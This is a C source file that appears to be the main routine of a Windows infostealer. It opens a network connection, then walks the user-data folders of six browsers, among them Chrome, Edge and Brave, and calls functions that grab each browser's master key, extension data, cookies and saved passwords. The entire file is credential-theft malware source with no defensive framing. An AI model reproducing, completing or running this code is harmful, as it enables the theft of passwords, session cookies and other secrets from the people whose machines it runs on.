#include "../include/ExtensionsGrabber.h"
#include "../include/BrowserGrabber.h"
#include "../include/DirectoryOps.h"
#include "../include/StringUtils.h"
#include "../include/MasterKeyGrabber.h"
#include "../include/syscalls.h"
#include "../include/PathOps.h"
#include "../include/SendData.h"

#include <windows.h>

#define BROWSERS 6

int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, INT nShowCmd) {
    HANDLE              FolderHandle      = {0};
    unsigned short      FolderPath[256]   = {0};
    int                 idx               = 0;

    if (InitConnection() == -1) {
        return 1;
    }

    unsigned short *paths[] = {
        L"\\Amigo\\User Data",
        L"\\Sputnik\\Sputnik\\User Data",
        L"\\Google\\Chrome\\User Data",
        L"\\Microsoft\\Edge\\User Data",
        L"\\Kometa\\User Data",
		L"\\BraveSoftware\\Brave-Browser\\User Data"
    };

    while (idx < BROWSERS) {
        InitPath(paths[idx], FolderPath);
        if (OpenFolder(&FolderHandle, FolderPath) == 0) {
            GrabMasterKey(FolderPath);
            ExtensionsGrabber(FolderPath);
            GrabCookies(FolderPath);
            GrabPassword(FolderPath);
        }
        idx++;
    }

    return 0;
}